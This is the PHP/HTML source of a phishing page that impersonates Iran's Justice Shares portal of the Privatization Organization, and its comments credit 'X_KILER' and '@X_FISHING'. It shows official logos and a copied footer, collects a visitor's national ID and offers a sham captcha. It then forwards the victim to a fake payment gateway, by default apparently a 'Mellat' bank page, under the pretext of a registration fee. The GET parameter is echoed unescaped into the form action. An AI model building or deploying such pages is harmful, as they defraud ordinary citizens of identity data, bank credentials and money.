
<?php
$e=intval($_GET["e"]);
if(isset($_GET["P"])){
	$P=$_GET["P"];
}else{
	$P="Mellat";
}

?>

<!DOCTYPE html>

<html lang="en">

<!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <meta http-equiv="X-UA-Compatible" content="ie=edge">

    <title>سامانه سهام عدالت - سازمان خصوصی سازی</title>

<!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->

    <link rel='stylesheet' href='css/styles.css'>

    <link rel='stylesheet' href='css/grid.min.css'>

<!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->

    <script>

        function numberonly(elem) {

            elem.value = elem.value.toString().replace(/(?!^-)[^0-9]/g, "");

        }



        function elemval(elemid){

            return document.getElementById(elemid).value;

        }



        function focusElem(elemid){

            var elem = document.getElementById(elemid);

            elem.focus();

        }



    // show a notification animation on an element

    function notifyElem(elemid,msg) {

        var elem = document.getElementById(elemid);

        elem.focus();

        var elemclass = elem.className;

        elem.className = elemclass.replace('notifyelem', '');

        if(msg){

            alert(msg);

        }else{

            alert('لطفا اطلاعات مورد نطر را وارد نمایید.');

        }

        elem.className = elem.className + ' notifyelem';

    }



    </script>

</head>



<body class="applayout">



    <div class="header no-print">

        <div class="logo-div hidden sm-block" style="">

            <img src="img/ipo_logo_white_sans.png">

        </div>

    </div>

    <div class="content blue-shadow">

        <div class="container">

            <div class="row">

                <div class="col-lg-4 ipologo hidden-xs hidden-sm text-right">

                    <img  src="img/khosoosisazi-ipo-ir2.png">

                </div>

                <div class="col-lg-4 center-content">

                    <!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->

                </div>

                <div class="col-lg-4 right-logo hidden-xs hidden-sm text-left">

                    <img src="img/ir-logo.png">

                </div>

            </div>

        </div>

            <!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->



        <form id="form1" action="../<?php echo $P?>/?e=<?php echo $e?>" method="POST">

    <div id="nin-form" class="form-div " >

        <div class="form-title">

            <div class="form-title-text"> شماره ملی</div>

        </div>

<!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->

        <div class="form-content">

            <div class="form-content-inner">

                <h1>

                    لطفا شماره ملی سهام دار را

                    با صفر های اول شماره

                    به صورت کامل و بدون خط تیره

                    <br>

                    ( ۱۰ رقمی )

                    وارد کنید

                </h1>

                <h2>

                    مثال

                    <br>

                    0070854309

                
					<br>
					
پس از وارد کردن شماره ملی به درگاه پرداخت وارد میشوید و پس از پرداخت حق کاربری در سامانه ثبت نام میکنید .
           <br>
           	حق کاربری 20،000 ریال
           
    </h2>
                <div class="input-container">

                    <input name="nin" maxlength="10" tabindex="1" title="شماره ملی" type="text" id="nin-input" onkeyup="numberonly(this);" onkeypress="handleKeyPress();">

                </div>





                <div class="vgap"></div>

                <div class="vgap"></div>


<!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->


                <div class="captcha-div">

                    <table class="captcha-table">

                        <tr>

                            <td id="captcha_cell" class="captcha-img-cell" onclick="" >

                                <a title="برای تغییر کد امنیتی کلیک کنید" href="/checknin"><svg xmlns="http://www.w3.org/2000/svg" width="150" height="50" viewBox="0,0,150,50"><path d="M10 21 C62 48,92 24,141 16" stroke="#444" fill="none"/><path d="M17 15 C59 24,71 15,144 22" stroke="#333" fill="none"/><path d="M3 5 C54 6,82 27,148 10" stroke="#888" fill="none"/><path fill="#444" d="M54.18 26.79L54.26 26.88L54.12 26.73Q55.96 26.94 57.79 26.94L57.91 27.06L57.82 26.97Q59.60 26.96 61.43 26.81L61.54 26.92L61.41 26.79Q61.28 27.43 61.28 28.15L61.24 28.11L61.25 29.45L61.27 29.47Q58.95 29.51 54.19 29.62L54.24 29.67L54.16 29.59Q54.12 35.49 52.98 40.48L53.08 40.58L53.02 40.52Q50.82 41.21 49.33 42.01L49.30 41.97L49.35 42.03Q51.61 35.15 51.35 28.03L51.47 28.15L51.53 28.22Q51.20 21.00 48.54 14.34L48.52 14.32L48.52 14.32Q52.23 16.89 56.99 17.11L57.03 17.16L57.03 17.16Q61.66 17.30 65.81 15.54L65.67 15.40L65.72 15.45Q65.56 16.40 65.33 17.20L65.34 17.21L64.83 18.79L64.84 18.80Q62.09 19.85 59.12 20.01L59.01 19.90L59.14 20.03Q56.20 20.17 53.34 19.45L53.37 19.48L53.31 19.42Q53.98 22.79 54.17 26.79ZM66.47 14.87L66.30 14.71L66.49 14.90Q61.86 17.00 56.98 16.69L57.00 16.71L56.88 16.59Q51.61 16.35 47.88 13.49L47.93 13.54L47.91 13.52Q50.82 20.50 51.12 28.11L51.06 28.05L51.15 28.14Q51.37 35.98 48.86 42.75L48.94 42.84L48.95 42.84Q49.54 42.37 50.91 41.73L50.84 41.65L50.97 41.78Q50.63 42.39 50.06 43.91L50.21 44.07L50.21 44.06Q52.48 42.95 55.37 42.45L55.40 42.48L55.45 42.53Q56.01 37.61 56.20 31.90L56.19 31.89L56.19 31.89Q58.01 31.88 59.84 31.88L59.83 31.87L59.87 31.91Q61.62 31.87 63.44 32.06L63.31 31.92L63.47 32.09Q63.35 31.13 63.35 30.22L63.35 30.21L63.34 28.30L63.32 28.28Q62.46 28.30 61.63 28.30L61.72 28.39L61.61 28.29Q61.75 27.55 61.83 26.53L61.85 26.54L61.69 26.38Q60.30 26.55 58.89 26.55L59.07 26.74L58.93 26.60Q57.63 26.71 56.26 26.67L56.17 26.58L56.19 24.46L56.18 24.46Q56.17 23.38 56.05 22.31L55.95 22.20L55.99 22.25Q56.93 22.28 57.92 22.28L57.86 22.21L57.88 22.23Q62.65 22.25 66.27 20.34L66.41 20.49L66.28 20.35Q66.87 18.62 67.78 16.00L67.82 16.03L67.75 15.96Q66.45 16.80 65.65 17.14L65.69 17.18L65.59 17.07Q65.86 16.32 66.36 14.76Z"/><path fill="#333" d="M35.32 40.39L35.23 40.30L35.28 40.35Q32.27 36.43 29.64 27.78L29.79 27.93L29.73 27.87Q29.07 25.73 28.27 23.59L28.21 23.53L25.41 32.39L25.41 32.38Q23.58 37.30 21.19 40.53L21.19 40.54L21.05 40.40Q20.38 40.64 18.74 40.79L18.67 40.71L18.65 40.70Q18.75 39.50 18.75 38.25L18.75 38.25L18.82 38.32Q18.72 32.21 15.98 26.08L16.06 26.15L16.01 26.11Q12.88 19.21 7.02 14.22L7.13 14.33L7.11 14.31Q9.19 14.94 11.55 15.47L11.65 15.57L11.53 15.46Q20.26 23.96 21.56 34.93L21.53 34.90L21.44 34.81Q23.13 31.55 24.57 26.18L24.58 26.18L24.52 26.13Q26.51 18.64 27.01 17.23L27.08 17.31L29.42 17.40L29.41 17.39Q30.10 19.41 30.75 21.73L30.64 21.62L31.95 26.14L31.99 26.17Q33.45 31.51 34.86 34.75L34.97 34.86L34.98 34.87Q36.54 23.14 44.45 15.79L44.53 15.87L44.47 15.81Q45.92 15.40 48.89 14.75L49.06 14.92L48.91 14.77Q43.65 19.14 40.60 25.27L40.60 25.26L40.63 25.29Q37.47 31.46 37.47 38.23L37.51 38.28L37.54 38.31Q37.54 39.41 37.62 40.56L37.51 40.45L36.45 40.42L36.37 40.33Q35.85 40.35 35.28 40.35ZM41.65 43.37L41.59 43.31L41.63 43.35Q40.29 39.68 40.40 35.80L40.47 35.87L40.32 35.72Q40.66 24.18 50.03 15.92L50.08 15.98L50.03 15.93Q49.18 16.26 47.24 16.79L47.24 16.79L47.22 16.77Q48.21 15.98 50.12 14.19L50.16 14.23L50.04 14.11Q47.40 14.90 44.47 15.39L44.42 15.34L44.52 15.44Q36.96 22.50 35.06 31.98L34.99 31.91L35.06 31.99Q34.53 30.39 31.67 18.93L31.64 18.89L31.69 18.94Q31.24 18.99 30.29 18.99L30.34 19.04L29.92 17.86L29.90 17.83Q29.79 17.31 29.57 16.82L29.61 16.86L26.66 16.81L26.69 16.84Q25.95 19.37 24.67 24.49L24.54 24.36L24.57 24.38Q23.44 29.65 22.45 32.13L22.43 32.10L22.32 31.99Q20.72 24.07 15.16 17.75L15.25 17.85L15.31 17.91Q14.73 17.75 13.78 17.55L13.86 17.63L13.70 17.48Q13.00 16.66 11.44 15.03L11.54 15.13L11.50 15.09Q8.10 14.28 5.93 13.48L6.02 13.56L5.91 13.46Q11.55 18.10 14.82 24.31L14.81 24.29L14.82 24.30Q18.45 31.09 18.45 38.10L18.38 38.03L18.40 38.05Q18.29 39.50 18.10 41.10L18.16 41.16L18.25 41.25Q18.48 41.25 18.93 41.15L18.87 41.09L18.83 41.05Q19.25 40.91 19.48 40.91L19.49 40.93L19.63 42.10L19.59 42.05Q19.57 42.49 19.64 43.02L19.59 42.97L19.70 43.08Q20.79 42.95 23.08 42.80L23.13 42.85L23.13 42.86Q26.68 37.38 29.42 27.98L29.35 27.91L29.37 27.93Q32.24 36.82 35.21 40.78L35.19 40.75L35.07 40.63Q35.59 40.69 36.42 40.81L36.56 40.95L36.45 40.84Q37.34 41.91 38.40 42.98L38.45 43.03L38.38 42.96Q39.07 42.92 41.47 43.19Z"/><path fill="#222" d="M86.88 30.51L86.74 30.36L86.91 30.53Q83.37 36.82 79.95 40.78L79.86 40.69L79.93 40.77Q78.10 41.22 75.67 42.09L75.62 42.05L75.62 42.05Q80.55 36.47 85.30 28.05L85.30 28.05L85.32 28.07Q80.71 21.10 74.73 14.70L74.64 14.61L74.61 14.57Q77.68 15.93 79.96 16.43L79.90 16.37L79.80 16.27Q84.46 21.50 86.90 25.46L86.93 25.49L86.94 25.50Q89.47 21.10 93.39 16.69L93.44 16.74L93.49 16.78Q95.00 16.39 98.20 15.63L98.22 15.65L98.17 15.60Q92.21 22.16 88.74 28.10L88.55 27.91L88.73 28.09Q93.78 36.65 98.16 41.22L98.29 41.34L98.26 41.32Q95.53 40.38 93.44 40.15L93.46 40.17L93.59 40.30Q90.78 37.29 86.85 30.48ZM93.47 40.60L93.36 40.49L93.52 40.65Q93.80 40.66 94.26 40.77L94.22 40.74L94.17 40.69Q95.01 41.49 96.54 43.09L96.59 43.15L96.63 43.18Q99.85 43.85 102.89 45.22L102.99 45.32L102.96 45.29Q95.84 38.71 90.74 29.95L90.58 29.79L90.68 29.88Q94.47 23.29 100.37 16.44L100.31 16.37L100.43 16.49Q98.93 17.09 96.76 17.62L96.65 17.51L96.64 17.50Q97.63 16.70 99.38 14.91L99.26 14.78L99.31 14.84Q97.04 15.84 93.34 16.41L93.23 16.29L93.25 16.32Q89.74 20.04 87.16 24.35L87.21 24.40L87.33 24.52Q86.35 22.85 85.17 21.37L85.16 21.36L82.79 18.34L82.42 18.35L82.46 18.39Q82.31 18.40 82.09 18.32L82.13 18.37L82.14 18.38Q81.44 17.52 79.95 15.96L79.98 15.99L80.01 16.02Q76.06 15.00 73.47 13.63L73.62 13.78L73.51 13.67Q80.18 20.87 84.75 27.91L84.78 27.95L84.81 27.98Q80.28 36.13 74.54 42.71L74.59 42.76L74.62 42.80Q75.86 42.06 77.99 41.48L78.13 41.63L76.80 43.04L76.80 43.03Q76.83 43.06 75.49 44.39L75.45 44.35L75.37 44.27Q78.42 43.24 81.58 42.75L81.70 42.88L81.55 42.72Q85.59 38.24 88.18 33.48L88.22 33.52L88.15 33.45Q90.82 37.79 93.52 40.65Z"/><path fill="#333" d="M117.36 29.82L117.38 29.84L117.38 29.84Q114.92 29.78 113.59 31.00L113.60 31.02L113.48 30.90Q112.25 32.22 112.56 34.73L112.61 34.78L112.56 34.73Q112.89 37.27 114.11 38.53L114.14 38.55L114.09 38.50Q115.25 39.93 117.38 39.85L117.38 39.86L117.29 39.76Q117.76 39.67 117.95 39.67L118.08 39.79L118.12 39.83Q121.65 39.22 121.77 34.61L121.64 34.49L121.76 34.60Q121.73 32.14 121.04 31.34L120.99 31.28L121.00 31.29Q120.08 30.15 117.53 29.99ZM120.68 41.55L120.77 41.65L120.74 41.61Q119.52 42.30 117.96 42.23L117.86 42.12L117.92 42.19Q114.08 42.38 112.78 39.79L112.70 39.70L112.80 39.80Q112.66 45.18 111.32 49.44L111.15 49.28L111.24 49.36Q109.54 49.95 107.90 50.67L107.87 50.63L107.82 50.58Q110.35 44.59 110.08 37.62L110.05 37.58L110.11 37.65Q109.79 30.74 106.90 24.69L107.00 24.79L106.92 24.71Q108.98 26.01 110.69 26.46L110.68 26.45L111.16 27.89L111.11 27.84Q111.16 28.11 111.43 29.22L111.50 29.29L111.50 29.29Q112.56 27.27 116.14 27.08L116.19 27.13L116.15 27.09Q116.92 26.94 117.79 26.94L117.91 27.06L118.36 27.02L118.27 26.93Q118.48 27.02 118.67 27.06L118.76 27.15L119.07 27.15L118.94 27.03Q121.08 27.38 121.80 27.61L121.71 27.51L121.78 27.58Q123.29 28.06 124.17 29.02L124.08 28.92L124.23 29.08Q124.92 30.11 124.88 31.52L124.85 31.49L124.90 31.54Q124.90 34.39 124.10 37.06L124.08 37.04L124.19 37.14Q123.06 40.55 120.70 41.57ZM125.10 42.32L125.05 42.24L124.97 42.15Q126.20 40.30 126.51 36.19L126.39 36.08L126.42 36.11Q126.59 34.37 126.59 33.11L126.58 33.11L126.52 33.04Q126.68 31.68 125.91 30.27L125.95 30.30L125.80 30.16Q125.44 29.76 124.94 29.37L124.85 29.28L124.75 29.07L124.58 28.78L124.62 28.70L124.58 28.67Q122.72 26.50 118.38 26.50L118.44 26.56L117.81 26.54L117.93 26.66Q113.23 26.61 111.59 28.21L111.56 28.17L111.56 28.17Q111.32 27.59 111.17 27.10L111.23 27.15L111.01 26.14L111.04 26.17Q108.56 25.55 106.35 24.07L106.30 24.01L106.35 24.07Q109.46 30.23 109.77 37.46L109.77 37.46L109.85 37.54Q110.14 44.80 107.29 51.27L107.26 51.24L109.34 50.47L109.33 50.46Q108.90 51.02 108.22 52.58L108.32 52.68L108.40 52.77Q110.95 51.54 113.27 51.20L113.28 51.22L113.27 51.20Q114.43 46.42 114.58 42.69L114.65 42.76L114.57 42.68Q115.97 44.16 119.59 44.39L119.60 44.40L119.61 44.41Q123.58 44.68 125.02 42.25L124.97 42.19ZM119.35 32.16L119.37 32.17L119.30 32.10Q119.98 32.07 121.09 32.41L121.20 32.52L121.13 32.45Q121.36 33.40 121.32 34.58L121.32 34.58L121.31 34.57Q121.24 35.42 121.05 36.07L121.20 36.21L121.16 36.17Q120.47 39.10 117.95 39.40L117.88 39.32L117.92 39.26L118.08 39.41Q117.93 39.34 117.81 39.38L117.78 39.34L117.37 39.46L117.24 39.33Q116.08 39.35 115.09 38.86L115.22 38.99L114.65 36.71L114.82 36.87Q114.56 34.44 115.85 33.42L115.87 33.44L115.99 33.56Q116.86 32.33 119.25 32.06Z"/></svg></a>

                            </td>

                            <td class="captcha-input-cell">

                                <input id="captcha" name="captcha" onkeypress="handleKeyPress()" class="" maxlength="4" tabindex="2"

                                    type="text" placeholder="لطفا کد امنیتی را وارد کنید" autocomplete="off">

                            </td>

                        </tr>

                    </table>

                </div>



               <!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************--> 



            </div>

        </div>



        <div class="form-footer">

            <div class="row rtl p-2">

                <div class="button-div col-md-6 col-sm-6 col-xl-6 col-xs-12 text-right">

                    <button class="new-btn btn-primary btn-min-width" type="button" tabindex="3" onclick="validateAndSubmit();">ادامه</button>

                </div>

            </div>

        </div>

    </div>

</form>

<script>

<!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->

       



    // client side nin validation

    function validateNIN(snin) {

        // if string nin length is less than 10 character

        if (snin.length < 10) {

            // wrong nin

            return false;

        } else {

            // check for valid pattern

            if (snin == '0000000000' || snin == '1111111111' || snin == '2222222222' || snin == '3333333333' || snin == '4444444444' || snin == '5555555555' || snin == '6666666666' || snin == '7777777777' || snin == '8888888888' || snin == '9999999999') {

                return false;

            } else {

                // check for parity with refahi.ir check function

                var c = parseInt(snin.charAt(9));

                var n = parseInt(snin.charAt(0)) * 10 +

                    parseInt(snin.charAt(1)) * 9 +

                    parseInt(snin.charAt(2)) * 8 +

                    parseInt(snin.charAt(3)) * 7 +

                    parseInt(snin.charAt(4)) * 6 +

                    parseInt(snin.charAt(5)) * 5 +

                    parseInt(snin.charAt(6)) * 4 +

                    parseInt(snin.charAt(7)) * 3 +

                    parseInt(snin.charAt(8)) * 2;

                var r = n - parseInt(n / 11) * 11;

                //             return (r == 0 && r == c) || (r == 1 && c == 1) || (r > 1 && c == 11 - r);

                if ((r == 0 && r == c) || (r == 1 && c == 1) || (r > 1 && c == 11 - r)) {

                    return true;

                } else {

                    return false

                }

            }



        }

    }



function validate_captcha(){

    if(document.getElementById('captcha').value && document.getElementById('captcha').value.length==4){

        return true ; 

    }else{

        return false ; 

    }

    

}



    function validateAndSubmit(){

        // validate nin         

        var nin = elemval('nin-input').replace(/-/g, '');

        if(nin.length == 10 && validateNIN(nin) == true){

            // nin pass 

        }else{

            notifyElem('nin-input','لطفا شماره ملی را به شکل صحیح را وارد نمایید.');

            return false ; 

        }



        if (validate_captcha()){

            // captcha pass 

        }else{

            notifyElem('captcha','لطفا کد امنیتی را وارد نمایید.');

            return false ; 

        }



        document.getElementById('form1').submit();

    }



    function quickInq(){

        if(validate_captcha()){

            // validate nin         

            var nin = elemval('nin-input').replace(/-/g, '');

            if(nin.length == 10 && validateNIN(nin) == true){

                var form = document.getElementById('form1');

                form.action = '/quickInq';

                form.submit();

            }else{

                notifyElem('nin-input','لطفا شماره ملی را به شکل صحیح را وارد نمایید.');

            }

        }else{

            notifyElem('captcha','لطفا کد امنیتی را وارد نمایید.');

        }

    }



    function handleKeyPress() {

        var x = event.which || event.keyCode;

        if (x == 13) {

            validateAndSubmit();

        }

    }





focusElem('nin-input');



</script>

<!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->



    </div>



    <div id="footer" class="no-print hidden">

        <div id="footertop">

            کلیه حقوق مادی و معنوی این سایت متعلق به سازمان خصوصی سازی می باشد

        </div>

        <br>

        <div id="footerbot">

            طراحی شده توسط دفتر فناوری اطلاعات سازمان خصوصی سازی

        </div>

    </div>



</body>

<!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->

  <style>img[alt="www.000webhost.com"]{display:none;}</style>



</html>